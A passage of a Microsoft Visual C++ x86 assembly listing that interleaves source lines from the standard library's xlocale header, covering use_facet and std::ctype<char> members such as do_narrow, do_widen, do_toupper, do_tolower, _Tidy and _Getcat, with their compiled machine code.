; 435  : 
; 436  : #if defined(_M_CEE)
; 437  :             _Facet_Register_m(_Pfmod);
; 438  : #else // ^^^ defined(_M_CEE) / !defined(_M_CEE) vvv
; 439  :             _Facet_Register(_Pfmod);

  00076	8b 4d f8	 mov	 ecx, DWORD PTR __Pfmod$6[ebp]
  00079	51		 push	 ecx
  0007a	e8 00 00 00 00	 call	 ?_Facet_Register@std@@YAXPAV_Facet_base@1@@Z ; std::_Facet_Register
  0007f	83 c4 04	 add	 esp, 4

; 440  : #endif // ^^^ !defined(_M_CEE) ^^^
; 441  : 
; 442  :             _Pfmod->_Incref();

  00082	8b 55 f8	 mov	 edx, DWORD PTR __Pfmod$6[ebp]
  00085	8b 02		 mov	 eax, DWORD PTR [edx]
  00087	8b 4d f8	 mov	 ecx, DWORD PTR __Pfmod$6[ebp]
  0008a	8b 50 04	 mov	 edx, DWORD PTR [eax+4]
  0008d	ff d2		 call	 edx

; 443  :             _Facetptr<_Facet>::_Psave = _Psave;

  0008f	8b 45 fc	 mov	 eax, DWORD PTR __Psave$7[ebp]
  00092	a3 00 00 00 00	 mov	 DWORD PTR ?_Psave@?$_Facetptr@V?$ctype@D@std@@@std@@2PBVfacet@locale@2@B, eax ; std::_Facetptr<std::ctype<char> >::_Psave

; 444  :             _Pf                       = _Psave;

  00097	8b 4d fc	 mov	 ecx, DWORD PTR __Psave$7[ebp]
  0009a	89 4d f4	 mov	 DWORD PTR __Pf$5[ebp], ecx

; 445  : 
; 446  :             (void) _Psave_guard.release();

  0009d	8d 4d f0	 lea	 ecx, DWORD PTR __Psave_guard$4[ebp]
  000a0	e8 00 00 00 00	 call	 ?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAEPAV_Facet_base@2@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::release

; 447  :         }

  000a5	8d 4d f0	 lea	 ecx, DWORD PTR __Psave_guard$4[ebp]
  000a8	e8 00 00 00 00	 call	 ??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAE@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::~unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >
$LN6@use_facet:

; 448  :     }
; 449  : 
; 450  :     return static_cast<const _Facet&>(*_Pf); // should be dynamic_cast

  000ad	8b 55 f4	 mov	 edx, DWORD PTR __Pf$5[ebp]
  000b0	89 55 e4	 mov	 DWORD PTR $T1[ebp], edx
  000b3	8d 4d e8	 lea	 ecx, DWORD PTR __Lock$2[ebp]
  000b6	e8 00 00 00 00	 call	 ??1_Lockit@std@@QAE@XZ	; std::_Lockit::~_Lockit
  000bb	8b 45 e4	 mov	 eax, DWORD PTR $T1[ebp]
$LN1@use_facet:

; 451  :     _END_LOCK()
; 452  : } // end of use_facet body

  000be	8b e5		 mov	 esp, ebp
  000c0	5d		 pop	 ebp
  000c1	c3		 ret	 0
??$use_facet@V?$ctype@D@std@@@std@@YAABV?$ctype@D@0@ABVlocale@0@@Z ENDP ; std::use_facet<std::ctype<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_G?$ctype@D@std@@MAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_G?$ctype@D@std@@MAEPAXI@Z PROC			; std::ctype<char>::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1?$ctype@D@std@@MAE@XZ ; std::ctype<char>::~ctype<char>
  0000f	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00012	83 e0 01	 and	 eax, 1
  00015	74 0e		 je	 SHORT $LN2@scalar
  00017	6a 18		 push	 24			; 00000018H
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00022	83 c4 08	 add	 esp, 8
$LN2@scalar:
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??_G?$ctype@D@std@@MAEPAXI@Z ENDP			; std::ctype<char>::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ?do_narrow@?$ctype@D@std@@MBEPBDPBD0DPAD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
___formal$ = 16						; size = 1
__Dest$ = 20						; size = 4
?do_narrow@?$ctype@D@std@@MBEPBDPBD0DPAD@Z PROC		; std::ctype<char>::do_narrow, COMDAT
; _this$ = ecx

; 2798 :         char* _Dest) const { // narrow elements in [_First, _Last) to chars

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2799 :         _Adl_verify_range(_First, _Last);

  00007	8d 45 0c	 lea	 eax, DWORD PTR __Last$[ebp]
  0000a	50		 push	 eax
  0000b	8d 4d 08	 lea	 ecx, DWORD PTR __First$[ebp]
  0000e	51		 push	 ecx
  0000f	e8 00 00 00 00	 call	 ??$_Adl_verify_range@PBDPBD@std@@YAXABQBD0@Z ; std::_Adl_verify_range<char const *,char const *>
  00014	83 c4 08	 add	 esp, 8

; 2800 :         _CSTD memcpy(_Dest, _First, static_cast<size_t>(_Last - _First));

  00017	8b 55 0c	 mov	 edx, DWORD PTR __Last$[ebp]
  0001a	2b 55 08	 sub	 edx, DWORD PTR __First$[ebp]
  0001d	52		 push	 edx
  0001e	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  00021	50		 push	 eax
  00022	8b 4d 14	 mov	 ecx, DWORD PTR __Dest$[ebp]
  00025	51		 push	 ecx
  00026	e8 00 00 00 00	 call	 _memcpy
  0002b	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2801 :         return _Last;

  0002e	8b 45 0c	 mov	 eax, DWORD PTR __Last$[ebp]

; 2802 :     }

  00031	8b e5		 mov	 esp, ebp
  00033	5d		 pop	 ebp
  00034	c2 10 00	 ret	 16			; 00000010H
?do_narrow@?$ctype@D@std@@MBEPBDPBD0DPAD@Z ENDP		; std::ctype<char>::do_narrow
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ?do_narrow@?$ctype@D@std@@MBEDDD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Ch$ = 8						; size = 1
___formal$ = 12						; size = 1
?do_narrow@?$ctype@D@std@@MBEDDD@Z PROC			; std::ctype<char>::do_narrow, COMDAT
; _this$ = ecx

; 2793 :     virtual _Elem __CLR_OR_THIS_CALL do_narrow(_Elem _Ch, char) const { // narrow char

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2794 :         return _Ch;

  00007	0f b6 45 08	 movzx	 eax, BYTE PTR __Ch$[ebp]

; 2795 :     }

  0000b	8b e5		 mov	 esp, ebp
  0000d	5d		 pop	 ebp
  0000e	c2 08 00	 ret	 8
?do_narrow@?$ctype@D@std@@MBEDDD@Z ENDP			; std::ctype<char>::do_narrow
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ?do_widen@?$ctype@D@std@@MBEPBDPBD0PAD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
__Dest$ = 16						; size = 4
?do_widen@?$ctype@D@std@@MBEPBDPBD0PAD@Z PROC		; std::ctype<char>::do_widen, COMDAT
; _this$ = ecx

; 2787 :         const char* _First, const char* _Last, _Elem* _Dest) const { // widen chars in [_First, _Last)

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2788 :         _Adl_verify_range(_First, _Last);

  00007	8d 45 0c	 lea	 eax, DWORD PTR __Last$[ebp]
  0000a	50		 push	 eax
  0000b	8d 4d 08	 lea	 ecx, DWORD PTR __First$[ebp]
  0000e	51		 push	 ecx
  0000f	e8 00 00 00 00	 call	 ??$_Adl_verify_range@PBDPBD@std@@YAXABQBD0@Z ; std::_Adl_verify_range<char const *,char const *>
  00014	83 c4 08	 add	 esp, 8

; 2789 :         _CSTD memcpy(_Dest, _First, static_cast<size_t>(_Last - _First));

  00017	8b 55 0c	 mov	 edx, DWORD PTR __Last$[ebp]
  0001a	2b 55 08	 sub	 edx, DWORD PTR __First$[ebp]
  0001d	52		 push	 edx
  0001e	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  00021	50		 push	 eax
  00022	8b 4d 10	 mov	 ecx, DWORD PTR __Dest$[ebp]
  00025	51		 push	 ecx
  00026	e8 00 00 00 00	 call	 _memcpy
  0002b	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2790 :         return _Last;

  0002e	8b 45 0c	 mov	 eax, DWORD PTR __Last$[ebp]

; 2791 :     }

  00031	8b e5		 mov	 esp, ebp
  00033	5d		 pop	 ebp
  00034	c2 0c 00	 ret	 12			; 0000000cH
?do_widen@?$ctype@D@std@@MBEPBDPBD0PAD@Z ENDP		; std::ctype<char>::do_widen
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ?do_widen@?$ctype@D@std@@MBEDD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Byte$ = 8						; size = 1
?do_widen@?$ctype@D@std@@MBEDD@Z PROC			; std::ctype<char>::do_widen, COMDAT
; _this$ = ecx

; 2782 :     virtual _Elem __CLR_OR_THIS_CALL do_widen(char _Byte) const { // widen char

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2783 :         return _Byte;

  00007	0f b6 45 08	 movzx	 eax, BYTE PTR __Byte$[ebp]

; 2784 :     }

  0000b	8b e5		 mov	 esp, ebp
  0000d	5d		 pop	 ebp
  0000e	c2 04 00	 ret	 4
?do_widen@?$ctype@D@std@@MBEDD@Z ENDP			; std::ctype<char>::do_widen
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ?do_toupper@?$ctype@D@std@@MBEPBDPADPBD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
?do_toupper@?$ctype@D@std@@MBEPBDPADPBD@Z PROC		; std::ctype<char>::do_toupper, COMDAT
; _this$ = ecx

; 2773 :         const _Elem* _Last) const { // convert [_First, _Last) in place to upper case

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2774 :         _Adl_verify_range(_First, _Last);

  00007	8d 45 0c	 lea	 eax, DWORD PTR __Last$[ebp]
  0000a	50		 push	 eax
  0000b	8d 4d 08	 lea	 ecx, DWORD PTR __First$[ebp]
  0000e	51		 push	 ecx
  0000f	e8 00 00 00 00	 call	 ??$_Adl_verify_range@PADPBD@std@@YAXABQADABQBD@Z ; std::_Adl_verify_range<char *,char const *>
  00014	83 c4 08	 add	 esp, 8

; 2775 :         for (; _First != _Last; ++_First) {

  00017	eb 09		 jmp	 SHORT $LN4@do_toupper
$LN2@do_toupper:
  00019	8b 55 08	 mov	 edx, DWORD PTR __First$[ebp]
  0001c	83 c2 01	 add	 edx, 1
  0001f	89 55 08	 mov	 DWORD PTR __First$[ebp], edx
$LN4@do_toupper:
  00022	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  00025	3b 45 0c	 cmp	 eax, DWORD PTR __Last$[ebp]
  00028	74 1d		 je	 SHORT $LN3@do_toupper

; 2776 :             *_First = static_cast<_Elem>(_Toupper(static_cast<unsigned char>(*_First), &_Ctype));

  0002a	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002d	83 c1 08	 add	 ecx, 8
  00030	51		 push	 ecx
  00031	8b 55 08	 mov	 edx, DWORD PTR __First$[ebp]
  00034	0f b6 02	 movzx	 eax, BYTE PTR [edx]
  00037	50		 push	 eax
  00038	e8 00 00 00 00	 call	 __Toupper
  0003d	83 c4 08	 add	 esp, 8
  00040	8b 4d 08	 mov	 ecx, DWORD PTR __First$[ebp]
  00043	88 01		 mov	 BYTE PTR [ecx], al

; 2777 :         }

  00045	eb d2		 jmp	 SHORT $LN2@do_toupper
$LN3@do_toupper:

; 2778 : 
; 2779 :         return _First;

  00047	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]

; 2780 :     }

  0004a	8b e5		 mov	 esp, ebp
  0004c	5d		 pop	 ebp
  0004d	c2 08 00	 ret	 8
?do_toupper@?$ctype@D@std@@MBEPBDPADPBD@Z ENDP		; std::ctype<char>::do_toupper
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ?do_toupper@?$ctype@D@std@@MBEDD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Ch$ = 8						; size = 1
?do_toupper@?$ctype@D@std@@MBEDD@Z PROC			; std::ctype<char>::do_toupper, COMDAT
; _this$ = ecx

; 2768 :     virtual _Elem __CLR_OR_THIS_CALL do_toupper(_Elem _Ch) const { // convert element to upper case

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2769 :         return static_cast<_Elem>(_Toupper(static_cast<unsigned char>(_Ch), &_Ctype));

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	83 c0 08	 add	 eax, 8
  0000d	50		 push	 eax
  0000e	0f b6 4d 08	 movzx	 ecx, BYTE PTR __Ch$[ebp]
  00012	51		 push	 ecx
  00013	e8 00 00 00 00	 call	 __Toupper
  00018	83 c4 08	 add	 esp, 8

; 2770 :     }

  0001b	8b e5		 mov	 esp, ebp
  0001d	5d		 pop	 ebp
  0001e	c2 04 00	 ret	 4
?do_toupper@?$ctype@D@std@@MBEDD@Z ENDP			; std::ctype<char>::do_toupper
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ?do_tolower@?$ctype@D@std@@MBEPBDPADPBD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
?do_tolower@?$ctype@D@std@@MBEPBDPADPBD@Z PROC		; std::ctype<char>::do_tolower, COMDAT
; _this$ = ecx

; 2759 :         const _Elem* _Last) const { // convert [_First, _Last) in place to lower case

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2760 :         _Adl_verify_range(_First, _Last);

  00007	8d 45 0c	 lea	 eax, DWORD PTR __Last$[ebp]
  0000a	50		 push	 eax
  0000b	8d 4d 08	 lea	 ecx, DWORD PTR __First$[ebp]
  0000e	51		 push	 ecx
  0000f	e8 00 00 00 00	 call	 ??$_Adl_verify_range@PADPBD@std@@YAXABQADABQBD@Z ; std::_Adl_verify_range<char *,char const *>
  00014	83 c4 08	 add	 esp, 8

; 2761 :         for (; _First != _Last; ++_First) {

  00017	eb 09		 jmp	 SHORT $LN4@do_tolower
$LN2@do_tolower:
  00019	8b 55 08	 mov	 edx, DWORD PTR __First$[ebp]
  0001c	83 c2 01	 add	 edx, 1
  0001f	89 55 08	 mov	 DWORD PTR __First$[ebp], edx
$LN4@do_tolower:
  00022	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  00025	3b 45 0c	 cmp	 eax, DWORD PTR __Last$[ebp]
  00028	74 1d		 je	 SHORT $LN3@do_tolower

; 2762 :             *_First = static_cast<_Elem>(_Tolower(static_cast<unsigned char>(*_First), &_Ctype));

  0002a	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002d	83 c1 08	 add	 ecx, 8
  00030	51		 push	 ecx
  00031	8b 55 08	 mov	 edx, DWORD PTR __First$[ebp]
  00034	0f b6 02	 movzx	 eax, BYTE PTR [edx]
  00037	50		 push	 eax
  00038	e8 00 00 00 00	 call	 __Tolower
  0003d	83 c4 08	 add	 esp, 8
  00040	8b 4d 08	 mov	 ecx, DWORD PTR __First$[ebp]
  00043	88 01		 mov	 BYTE PTR [ecx], al

; 2763 :         }

  00045	eb d2		 jmp	 SHORT $LN2@do_tolower
$LN3@do_tolower:

; 2764 : 
; 2765 :         return _First;

  00047	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]

; 2766 :     }

  0004a	8b e5		 mov	 esp, ebp
  0004c	5d		 pop	 ebp
  0004d	c2 08 00	 ret	 8
?do_tolower@?$ctype@D@std@@MBEPBDPADPBD@Z ENDP		; std::ctype<char>::do_tolower
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ?do_tolower@?$ctype@D@std@@MBEDD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Ch$ = 8						; size = 1
?do_tolower@?$ctype@D@std@@MBEDD@Z PROC			; std::ctype<char>::do_tolower, COMDAT
; _this$ = ecx

; 2754 :     virtual _Elem __CLR_OR_THIS_CALL do_tolower(_Elem _Ch) const { // convert element to lower case

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2755 :         return static_cast<_Elem>(_Tolower(static_cast<unsigned char>(_Ch), &_Ctype));

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	83 c0 08	 add	 eax, 8
  0000d	50		 push	 eax
  0000e	0f b6 4d 08	 movzx	 ecx, BYTE PTR __Ch$[ebp]
  00012	51		 push	 ecx
  00013	e8 00 00 00 00	 call	 __Tolower
  00018	83 c4 08	 add	 esp, 8

; 2756 :     }

  0001b	8b e5		 mov	 esp, ebp
  0001d	5d		 pop	 ebp
  0001e	c2 04 00	 ret	 4
?do_tolower@?$ctype@D@std@@MBEDD@Z ENDP			; std::ctype<char>::do_tolower
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ?_Tidy@?$ctype@D@std@@IAEXXZ
_TEXT	SEGMENT
$T1 = -8						; size = 4
_this$ = -4						; size = 4
?_Tidy@?$ctype@D@std@@IAEXXZ PROC			; std::ctype<char>::_Tidy, COMDAT
; _this$ = ecx

; 2744 :     void __CLR_OR_THIS_CALL _Tidy() noexcept { // free any allocated storage

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2745 :         if (0 < _Ctype._Delfl) {

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	83 78 10 00	 cmp	 DWORD PTR [eax+16], 0
  00010	7e 11		 jle	 SHORT $LN2@Tidy

; 2746 :             _CSTD free(const_cast<short*>(_Ctype._Table));

  00012	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00015	8b 51 0c	 mov	 edx, DWORD PTR [ecx+12]
  00018	52		 push	 edx
  00019	e8 00 00 00 00	 call	 _free
  0001e	83 c4 04	 add	 esp, 4
  00021	eb 1e		 jmp	 SHORT $LN4@Tidy
$LN2@Tidy:

; 2747 :         } else if (_Ctype._Delfl < 0) {

  00023	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00026	83 78 10 00	 cmp	 DWORD PTR [eax+16], 0
  0002a	7d 15		 jge	 SHORT $LN4@Tidy

; 2748 :             delete[] _Ctype._Table;

  0002c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002f	8b 51 0c	 mov	 edx, DWORD PTR [ecx+12]
  00032	89 55 f8	 mov	 DWORD PTR $T1[ebp], edx
  00035	8b 45 f8	 mov	 eax, DWORD PTR $T1[ebp]
  00038	50		 push	 eax
  00039	e8 00 00 00 00	 call	 ??_V@YAXPAX@Z		; operator delete[]
  0003e	83 c4 04	 add	 esp, 4
$LN4@Tidy:

; 2749 :         }
; 2750 : 
; 2751 :         _CSTD free(_Ctype._LocaleName);

  00041	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00044	8b 51 14	 mov	 edx, DWORD PTR [ecx+20]
  00047	52		 push	 edx
  00048	e8 00 00 00 00	 call	 _free
  0004d	83 c4 04	 add	 esp, 4

; 2752 :     }

  00050	8b e5		 mov	 esp, ebp
  00052	5d		 pop	 ebp
  00053	c3		 ret	 0
?_Tidy@?$ctype@D@std@@IAEXXZ ENDP			; std::ctype<char>::_Tidy
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ?_Init@?$ctype@D@std@@IAEXABV_Locinfo@2@@Z
_TEXT	SEGMENT
$T1 = -20						; size = 16
_this$ = -4						; size = 4
__Lobj$ = 8						; size = 4
?_Init@?$ctype@D@std@@IAEXABV_Locinfo@2@@Z PROC		; std::ctype<char>::_Init, COMDAT
; _this$ = ecx

; 2740 :     void __CLR_OR_THIS_CALL _Init(const _Locinfo& _Lobj) { // initialize from _Lobj

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 14	 sub	 esp, 20			; 00000014H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2741 :         _Ctype = _Lobj._Getctype();

  00009	8d 45 ec	 lea	 eax, DWORD PTR $T1[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d 08	 mov	 ecx, DWORD PTR __Lobj$[ebp]
  00010	e8 00 00 00 00	 call	 ?_Getctype@_Locinfo@std@@QBE?AU_Ctypevec@@XZ ; std::_Locinfo::_Getctype
  00015	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00018	83 c1 08	 add	 ecx, 8
  0001b	8b 10		 mov	 edx, DWORD PTR [eax]
  0001d	89 11		 mov	 DWORD PTR [ecx], edx
  0001f	8b 50 04	 mov	 edx, DWORD PTR [eax+4]
  00022	89 51 04	 mov	 DWORD PTR [ecx+4], edx
  00025	8b 50 08	 mov	 edx, DWORD PTR [eax+8]
  00028	89 51 08	 mov	 DWORD PTR [ecx+8], edx
  0002b	8b 40 0c	 mov	 eax, DWORD PTR [eax+12]
  0002e	89 41 0c	 mov	 DWORD PTR [ecx+12], eax

; 2742 :     }

  00031	8b e5		 mov	 esp, ebp
  00033	5d		 pop	 ebp
  00034	c2 04 00	 ret	 4
?_Init@?$ctype@D@std@@IAEXABV_Locinfo@2@@Z ENDP		; std::ctype<char>::_Init
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ??1?$ctype@D@std@@MAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1?$ctype@D@std@@MAE@XZ PROC				; std::ctype<char>::~ctype<char>, COMDAT
; _this$ = ecx

; 2736 :     __CLR_OR_THIS_CALL ~ctype() noexcept override {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7?$ctype@D@std@@6B@

; 2737 :         _Tidy();

  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	e8 00 00 00 00	 call	 ?_Tidy@?$ctype@D@std@@IAEXXZ ; std::ctype<char>::_Tidy

; 2738 :     }

  00018	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001b	e8 00 00 00 00	 call	 ??1ctype_base@std@@UAE@XZ ; std::ctype_base::~ctype_base
  00020	8b e5		 mov	 esp, ebp
  00022	5d		 pop	 ebp
  00023	c3		 ret	 0
??1?$ctype@D@std@@MAE@XZ ENDP				; std::ctype<char>::~ctype<char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ?_Getcat@?$ctype@D@std@@SAIPAPBVfacet@locale@2@PBV42@@Z
_TEXT	SEGMENT
$T1 = -68						; size = 52
tv87 = -16						; size = 4
tv88 = -12						; size = 4
$T2 = -8						; size = 4
$T3 = -4						; size = 4
__Ppf$ = 8						; size = 4
__Ploc$ = 12						; size = 4
?_Getcat@?$ctype@D@std@@SAIPAPBVfacet@locale@2@PBV42@@Z PROC ; std::ctype<char>::_Getcat, COMDAT

; 2717 :     static size_t __CLRCALL_OR_CDECL _Getcat(const locale::facet** _Ppf = nullptr, const locale* _Ploc = nullptr) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR $T3[ebp], 0

; 2718 :         if (_Ppf && !*_Ppf) {

  0000d	83 7d 08 00	 cmp	 DWORD PTR __Ppf$[ebp], 0
  00011	74 69		 je	 SHORT $LN6@Getcat
  00013	8b 45 08	 mov	 eax, DWORD PTR __Ppf$[ebp]
  00016	83 38 00	 cmp	 DWORD PTR [eax], 0
  00019	75 61		 jne	 SHORT $LN6@Getcat

; 2719 :             *_Ppf = new ctype<_Elem>(_Locinfo(_Ploc->_C_str()));

  0001b	6a 18		 push	 24			; 00000018H
  0001d	e8 00 00 00 00	 call	 ??2@YAPAXI@Z		; operator new
  00022	83 c4 04	 add	 esp, 4
  00025	89 45 f8	 mov	 DWORD PTR $T2[ebp], eax
  00028	83 7d f8 00	 cmp	 DWORD PTR $T2[ebp], 0
  0002c	74 2b		 je	 SHORT $LN4@Getcat
  0002e	8b 4d 0c	 mov	 ecx, DWORD PTR __Ploc$[ebp]
  00031	e8 00 00 00 00	 call	 ?_C_str@locale@std@@QBEPBDXZ ; std::locale::_C_str
  00036	50		 push	 eax
  00037	8d 4d bc	 lea	 ecx, DWORD PTR $T1[ebp]
  0003a	e8 00 00 00 00	 call	 ??0_Locinfo@std@@QAE@PBD@Z ; std::_Locinfo::_Locinfo
  0003f	83 4d fc 01	 or	 DWORD PTR $T3[ebp], 1
  00043	89 45 f0	 mov	 DWORD PTR tv87[ebp], eax
  00046	6a 00		 push	 0
  00048	8b 4d f0	 mov	 ecx, DWORD PTR tv87[ebp]
  0004b	51		 push	 ecx
  0004c	8b 4d f8	 mov	 ecx, DWORD PTR $T2[ebp]
  0004f	e8 00 00 00 00	 call	 ??0?$ctype@D@std@@QAE@ABV_Locinfo@1@I@Z ; std::ctype<char>::ctype<char>
  00054	89 45 f4	 mov	 DWORD PTR tv88[ebp], eax
  00057	eb 07		 jmp	 SHORT $LN5@Getcat
$LN4@Getcat:
  00059	c7 45 f4 00 00
	00 00		 mov	 DWORD PTR tv88[ebp], 0
$LN5@Getcat:
  00060	8b 55 08	 mov	 edx, DWORD PTR __Ppf$[ebp]
  00063	8b 45 f4	 mov	 eax, DWORD PTR tv88[ebp]
  00066	89 02		 mov	 DWORD PTR [edx], eax
  00068	8b 4d fc	 mov	 ecx, DWORD PTR $T3[ebp]
  0006b	83 e1 01	 and	 ecx, 1
  0006e	74 0c		 je	 SHORT $LN6@Getcat
  00070	83 65 fc fe	 and	 DWORD PTR $T3[ebp], -2	; fffffffeH
  00074	8d 4d bc	 lea	 ecx, DWORD PTR $T1[ebp]
  00077	e8 00 00 00 00	 call	 ??1_Locinfo@std@@QAE@XZ	; std::_Locinfo::~_Locinfo
$LN6@Getcat:

; 2720 :         }
; 2721 : 
; 2722 :         return _X_CTYPE;

  0007c	b8 02 00 00 00	 mov	 eax, 2

; 2723 :     }

  00081	8b e5		 mov	 esp, ebp
  00083	5d		 pop	 ebp
  00084	c3		 ret	 0
?_Getcat@?$ctype@D@std@@SAIPAPBVfacet@locale@2@PBV42@@Z ENDP ; std::ctype<char>::_Getcat
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xlocale
;	COMDAT ??0?$ctype@D@std@@QAE@ABV_Locinfo@1@I@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Lobj$ = 8						; size = 4
